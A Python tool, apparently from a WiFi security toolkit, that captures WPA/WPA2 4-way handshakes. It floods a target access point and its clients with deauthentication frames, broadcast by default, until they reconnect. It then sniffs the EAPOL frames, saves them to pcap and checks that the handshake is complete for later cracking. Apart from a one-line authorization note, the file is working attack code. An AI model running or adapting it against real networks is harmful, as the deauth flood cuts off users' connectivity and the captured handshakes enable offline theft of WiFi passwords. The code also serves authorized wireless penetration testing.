#!/usr/bin/env python3
"""
WPA Handshake Capture for Hoover WiFi Security Toolkit
Captures WPA/WPA2 4-way EAPOL handshake frames for authorized security testing
"""

import argparse
import os
import subprocess
import sys
import threading
import time
from datetime import datetime
from typing import Optional

from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap
from scapy.layers.eap import EAPOL
from scapy.sendrecv import sendp, sniff
from scapy.utils import rdpcap, wrpcap

from utils import check_monitor_mode, require_root, setup_logging, validate_interface, validate_mac


class HandshakeCapture:
    def __init__(
        self,
        interface: str,
        target_bssid: str,
        target_client: Optional[str] = None,
        channel: Optional[int] = None,
        output_dir: str = "captures",
        timeout: int = 120,
        deauth_count: int = 5,
        deauth_interval: float = 2.0,
        no_deauth: bool = False,
    ) -> None:
        self.interface: str = interface
        self.target_bssid: str = target_bssid.upper()
        self.target_client: Optional[str] = target_client.upper() if target_client else None
        self.channel: Optional[int] = channel
        self.output_dir: str = output_dir
        self.timeout: int = timeout
        self.deauth_count: int = deauth_count
        self.deauth_interval: float = deauth_interval
        self.no_deauth: bool = no_deauth
        self.logger = setup_logging("handshake_capture")
        self.eapol_frames: list = []
        self.handshake_complete: bool = False
        self._stop_event = threading.Event()
        self._start_time: Optional[float] = None
        self.verified: bool = False
        self.verification_result: Optional[dict] = None

    def packet_handler(self, packet) -> None:
        if not packet.haslayer(EAPOL):
            return

        try:
            if not packet.haslayer(Dot11):
                return

            dot11 = packet[Dot11]
            addrs = {str(getattr(dot11, f"addr{i}", "") or "").upper() for i in range(1, 4)}

            if self.target_bssid not in addrs:
                return

            if self.target_client:
                if self.target_client not in addrs:
                    return

            self.eapol_frames.append(packet)
            frame_num = len(self.eapol_frames)
            src = str(dot11.addr2 or "").upper()
            dst = str(dot11.addr1 or "").upper()
            self.logger.info("EAPOL frame %d captured: %s -> %s", frame_num, src, dst)

            if frame_num >= 4:
                self.handshake_complete = True
                self.logger.info("4-way handshake captured!")
                self._stop_event.set()

        except Exception as e:
            self.logger.debug("Error processing EAPOL packet: %s", e)

    def _send_deauth(self) -> None:
        client = self.target_client or "ff:ff:ff:ff:ff:ff"
        self.logger.info(
            "Sending deauth frames: %s -> %s (count: %d, interval: %.1fs)",
            self.target_bssid,
            client,
            self.deauth_count,
            self.deauth_interval,
        )

        while not self._stop_event.is_set():
            try:
                dot11_to_client = Dot11(
                    addr1=client, addr2=self.target_bssid, addr3=self.target_bssid
                )
                dot11_to_ap = Dot11(addr1=self.target_bssid, addr2=client, addr3=self.target_bssid)
                deauth = Dot11Deauth(reason=7)

                frame1 = RadioTap() / dot11_to_client / deauth
                frame2 = RadioTap() / dot11_to_ap / deauth

                for _ in range(self.deauth_count):
                    sendp(frame1, iface=self.interface, verbose=False)
                    sendp(frame2, iface=self.interface, verbose=False)

                self.logger.info("Sent %d deauth frames", self.deauth_count * 2)

            except Exception as e:
                self.logger.warning("Error sending deauth: %s", e)

            self._stop_event.wait(self.deauth_interval)

    def _set_channel(self, channel: int) -> None:
        try:
            if validate_interface(self.interface):
                subprocess.run(
                    ["iwconfig", self.interface, "channel", str(channel)],
                    capture_output=True,
                    text=True,
                    timeout=5,
                )
                self.logger.info("Set channel to %d", channel)
        except (subprocess.TimeoutExpired, FileNotFoundError, OSError) as e:
            self.logger.warning("Could not set channel: %s", e)

    def start(self) -> bool:
        os.makedirs(self.output_dir, exist_ok=True)
        self._start_time = time.time()

        self.logger.info("Starting handshake capture for %s", self.target_bssid)
        if self.target_client:
            self.logger.info("Target client: %s", self.target_client)
        self.logger.info("Timeout: %ds", self.timeout)

        if self.channel:
            self._set_channel(self.channel)

        if not self.no_deauth:
            deauth_thread = threading.Thread(target=self._send_deauth, daemon=True)
            deauth_thread.start()

        try:
            sniff(
                iface=self.interface,
                prn=self.packet_handler,
                stop_filter=lambda p: self._stop_event.is_set(),
                timeout=self.timeout,
                store=0,
            )
        except KeyboardInterrupt:
            self.logger.info("Capture interrupted by user")
        finally:
            self._stop_event.set()

        if self.handshake_complete:
            self.logger.info("Handshake successfully captured!")
        else:
            self.logger.warning(
                "Capture ended. %d EAPOL frames collected (handshake incomplete)",
                len(self.eapol_frames),
            )

        return self.handshake_complete

    def save_capture(self) -> Optional[str]:
        if not self.eapol_frames:
            self.logger.warning("No EAPOL frames to save")
            return None

        bssid_safe = self.target_bssid.replace(":", "-")
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"handshake_{bssid_safe}_{timestamp}.pcap"
        filepath = os.path.join(self.output_dir, filename)

        wrpcap(filepath, self.eapol_frames)
        self.logger.info("Capture saved to %s (%d frames)", filepath, len(self.eapol_frames))
        return filepath

    def get_status(self) -> dict:
        elapsed = time.time() - self._start_time if self._start_time else 0
        return {
            "target_bssid": self.target_bssid,
            "target_client": self.target_client,
            "frames_captured": len(self.eapol_frames),
            "handshake_complete": self.handshake_complete,
            "elapsed_time": round(elapsed, 1),
        }

    # ------------------------------------------------------------------
    # Handshake verification
    # ------------------------------------------------------------------

    # Key Info field bit masks (EAPOL-Key frame, offsets per 802.11i)
    _KEY_INFO_INSTALL = 0x0040
    _KEY_INFO_ACK = 0x0080
    _KEY_INFO_MIC = 0x0100
    _KEY_INFO_SECURE = 0x0200
    _KEY_INFO_PAIRWISE = 0x0008

    def classify_eapol_message(self, eapol_data: bytes) -> int:
        """Classify an EAPOL-Key frame body (bytes) as handshake message 1-4.

        ``eapol_data`` is the EAPOL-Key frame body (i.e. everything after
        the 4-byte EAPOL header: descriptor type, key info, key length,
        replay counter, nonce, ...). Returns 0 if the frame cannot be
        classified as part of a WPA/WPA2 4-way handshake.
        """
        if not eapol_data or len(eapol_data) < 3:
            return 0

        key_info = int.from_bytes(eapol_data[1:3], byteorder="big")

        ack = bool(key_info & self._KEY_INFO_ACK)
        mic = bool(key_info & self._KEY_INFO_MIC)

        # Message 3: Pairwise + ACK + MIC + Install
        if key_info & 0x01C8 == 0x01C8:
            return 3
        # Message 4: Pairwise + MIC + Secure, ACK clear
        if key_info & 0x0308 == 0x0308 and not ack:
            return 4
        # Message 2: Pairwise + MIC, ACK clear
        if key_info & 0x0108 == 0x0108 and not ack:
            return 2
        # Message 1: Pairwise + ACK, MIC clear
        if key_info & 0x0088 == 0x0088 and not mic:
            return 1

        return 0

    def _get_eapol_body(self, frame) -> bytes:
        """Extract the raw EAPOL-Key frame body bytes from a captured frame."""
        try:
            eapol_layer = frame[EAPOL]
            payload = getattr(eapol_layer, "payload", None)
            if payload is not None:
                return bytes(payload)
            return bytes(eapol_layer)
        except Exception as e:
            self.logger.debug("Could not extract EAPOL body: %s", e)
            return b""

    def _get_dot11(self, frame):
        try:
            return frame[Dot11]
        except Exception:
            return None

    def _classify_eapol_messages(self, frames: list) -> dict:
        """Classify a list of captured frames into msg1/2/3/4 groups.

        Returns a dict ``{1: [...], 2: [...], 3: [...], 4: [...]}`` where
        each entry is a list of ``{"frame": frame, "data": bytes}`` dicts.
        """
        classified: dict = {1: [], 2: [], 3: [], 4: []}
        for frame in frames or []:
            data = self._get_eapol_body(frame)
            if not data:
                continue
            msg_num = self.classify_eapol_message(data)
            if msg_num in classified:
                classified[msg_num].append({"frame": frame, "data": data})
        return classified

    def _check_nonce_consistency(self, classified: dict) -> bool:
        """Verify the ANonce in msg1 matches the ANonce in msg3."""
        msg1_frames = classified.get(1, [])
        msg3_frames = classified.get(3, [])
        if not msg1_frames or not msg3_frames:
            return False

        anonce1 = msg1_frames[0]["data"][13:45]
        anonce3 = msg3_frames[0]["data"][13:45]
        return len(anonce1) == 32 and anonce1 == anonce3

    def _check_replay_counters(self, classified: dict) -> bool:
        """Verify replay counters increment (non-decreasing) across msg1-4."""
        counters = []
        for msg_num in (1, 2, 3, 4):
            items = classified.get(msg_num, [])
            if not items:
                continue
            data = items[0]["data"]
            if len(data) < 13:
                continue
            counters.append(int.from_bytes(data[5:13], byteorder="big"))

        if len(counters) < 2:
            return False

        return all(counters[i] <= counters[i + 1] for i in range(len(counters) - 1))

    def _check_mic_present(self, classified: dict) -> bool:
        """Verify the MIC field is non-zero in msg2 and msg4 frames."""
        for msg_num in (2, 4):
            for item in classified.get(msg_num, []):
                data = item["data"]
                mic = data[77:93] if len(data) >= 93 else b""
                if not mic or mic == b"\x00" * len(mic):
                    return False
        return True

    def _extract_handshake_params(self, classified: dict) -> dict:
        """Extract ANonce, SNonce, AP MAC and client MAC from classified frames."""
        params: dict = {
            "anonce": None,
            "snonce": None,
            "ap_mac": None,
            "client_mac": None,
        }

        msg1_frames = classified.get(1, [])
        msg2_frames = classified.get(2, [])

        if msg1_frames:
            data = msg1_frames[0]["data"]
            if len(data) >= 45:
                params["anonce"] = data[13:45].hex()
            dot11 = self._get_dot11(msg1_frames[0]["frame"])
            if dot11 is not None:
                params["ap_mac"] = str(getattr(dot11, "addr2", "") or "").upper() or None
                params["client_mac"] = str(getattr(dot11, "addr1", "") or "").upper() or None

        if msg2_frames:
            data = msg2_frames[0]["data"]
            if len(data) >= 45:
                params["snonce"] = data[13:45].hex()
            if not params["ap_mac"] or not params["client_mac"]:
                dot11 = self._get_dot11(msg2_frames[0]["frame"])
                if dot11 is not None:
                    params["ap_mac"] = params["ap_mac"] or (
                        str(getattr(dot11, "addr1", "") or "").upper() or None
                    )
                    params["client_mac"] = params["client_mac"] or (
                        str(getattr(dot11, "addr2", "") or "").upper() or None
                    )

        return params

    def verify_handshake(self, frames: Optional[list] = None) -> dict:
        """Validate a captured WPA 4-way handshake.

        Uses ``frames`` if given, otherwise falls back to the in-memory
        frames collected during ``start()`` (``self.eapol_frames``).
        """
        if frames is None:
            frames = self.eapol_frames

        classified = self._classify_eapol_messages(frames)
        errors: list = []

        msg1_count = len(classified[1])
        msg2_count = len(classified[2])
        msg3_count = len(classified[3])
        msg4_count = len(classified[4])

        has_complete_handshake = all(classified[i] for i in (1, 2, 3, 4))
        if not has_complete_handshake:
            errors.append("Incomplete handshake: missing one or more of msg1-msg4")

        nonce_consistent = self._check_nonce_consistency(classified)
        if not nonce_consistent:
            errors.append("ANonce mismatch (or missing) between msg1 and msg3")

        replay_counter_valid = self._check_replay_counters(classified)
        if not replay_counter_valid:
            errors.append("Replay counters do not increment correctly")

        mic_present = self._check_mic_present(classified)
        if not mic_present:
            errors.append("MIC field is zero in msg2 and/or msg4")

        params = self._extract_handshake_params(classified)

        valid = has_complete_handshake and nonce_consistent and replay_counter_valid and mic_present

        result = {
            "valid": valid,
            "msg1_count": msg1_count,
            "msg2_count": msg2_count,
            "msg3_count": msg3_count,
            "msg4_count": msg4_count,
            "has_complete_handshake": has_complete_handshake,
            "nonce_consistent": nonce_consistent,
            "replay_counter_valid": replay_counter_valid,
            "mic_present": mic_present,
            "ap_mac": params.get("ap_mac"),
            "client_mac": params.get("client_mac"),
            "anonce": params.get("anonce"),
            "snonce": params.get("snonce"),
            "errors": errors,
        }

        self.verified = valid
        self.verification_result = result
        return result

    def verify_pcap_file(self, filepath: str) -> dict:
        """Load EAPOL frames from a pcap file and verify the handshake."""
        frames = rdpcap(filepath)
        return self.verify_handshake(frames)


def main() -> None:
    parser = argparse.ArgumentParser(
        description="WPA Handshake Capture - Capture 4-way EAPOL handshake",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Capture handshake with deauth
  sudo python3 handshake_capture.py -i wlan0mon -b AA:BB:CC:DD:EE:FF -ch 6

  # Target specific client
  sudo python3 handshake_capture.py -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66

  # Passive capture (no deauth)
  sudo python3 handshake_capture.py -i wlan0mon -b AA:BB:CC:DD:EE:FF --no-deauth

Note: Interface must be in monitor mode.
      Only use on networks you own or have authorization to test.
        """,
    )

    parser.add_argument("-i", "--interface", help="Wireless interface in monitor mode")
    parser.add_argument("-b", "--bssid", help="Target AP BSSID (MAC address)")
    parser.add_argument("-c", "--client", help="Target client MAC (default: any)")
    parser.add_argument("-ch", "--channel", type=int, help="Channel to listen on")
    parser.add_argument(
        "-o",
        "--output-dir",
        default="captures",
        help="Output directory for pcap files (default: captures)",
    )
    parser.add_argument(
        "-t", "--timeout", type=int, default=120, help="Capture timeout in seconds (default: 120)"
    )
    parser.add_argument(
        "--deauth-count", type=int, default=5, help="Deauth frames per burst (default: 5)"
    )
    parser.add_argument(
        "--deauth-interval",
        type=float,
        default=2.0,
        help="Seconds between deauth bursts (default: 2.0)",
    )
    parser.add_argument("--no-deauth", action="store_true", help="Passive capture only (no deauth)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
    parser.add_argument(
        "--verify",
        metavar="PCAP_FILE",
        help="Path to a .pcap file to verify (standalone verification "
        "mode; no capture is performed)",
    )
    parser.add_argument(
        "--verify-captured",
        action="store_true",
        help="Verify the 4-way handshake after capture completes",
    )

    args = parser.parse_args()

    logger = setup_logging("handshake_capture", verbose=args.verbose)

    # Standalone verification mode: just load a pcap and check it, no
    # interface/root/capture required.
    if args.verify:
        verifier = HandshakeCapture(
            interface=args.interface or "none",
            target_bssid=args.bssid or "00:00:00:00:00:00",
        )
        result = verifier.verify_pcap_file(args.verify)
        print(f"\nHandshake verification for: {args.verify}")
        print(f"  Valid handshake:      {result['valid']}")
        print(f"  Complete (4 msgs):    {result['has_complete_handshake']}")
        print(
            f"  Msg1/2/3/4 counts:    "
            f"{result['msg1_count']}/{result['msg2_count']}/"
            f"{result['msg3_count']}/{result['msg4_count']}"
        )
        print(f"  Nonce consistent:     {result['nonce_consistent']}")
        print(f"  Replay counters OK:   {result['replay_counter_valid']}")
        print(f"  MIC present:          {result['mic_present']}")
        print(f"  AP MAC:               {result['ap_mac']}")
        print(f"  Client MAC:           {result['client_mac']}")
        if result["errors"]:
            print("  Errors:")
            for err in result["errors"]:
                print(f"    - {err}")
        sys.exit(0 if result["valid"] else 1)

    if not args.interface or not args.bssid:
        logger.error("-i/--interface and -b/--bssid are required unless --verify is used")
        sys.exit(1)

    require_root()

    if not validate_mac(args.bssid):
        logger.error("Invalid BSSID format: %s", args.bssid)
        sys.exit(1)

    if args.client and not validate_mac(args.client):
        logger.error("Invalid client MAC format: %s", args.client)
        sys.exit(1)

    if not check_monitor_mode(args.interface):
        logger.warning("%s may not be in monitor mode", args.interface)
        response = input("Continue anyway? (y/N): ")
        if response.lower() != "y":
            sys.exit(1)

    capturer = HandshakeCapture(
        interface=args.interface,
        target_bssid=args.bssid,
        target_client=args.client,
        channel=args.channel,
        output_dir=args.output_dir,
        timeout=args.timeout,
        deauth_count=args.deauth_count,
        deauth_interval=args.deauth_interval,
        no_deauth=args.no_deauth,
    )

    success = capturer.start()
    filepath = capturer.save_capture()

    if success and filepath:
        print(f"\nHandshake captured and saved to: {filepath}")
    elif filepath:
        print(f"\nPartial capture saved to: {filepath}")
    else:
        print("\nNo EAPOL frames captured")

    if args.verify_captured:
        result = capturer.verify_handshake()
        print(f"\nHandshake verification result: valid={result['valid']}")
        if result["errors"]:
            for err in result["errors"]:
                print(f"  - {err}")

    sys.exit(0 if success else 1)


if __name__ == "__main__":
    main()
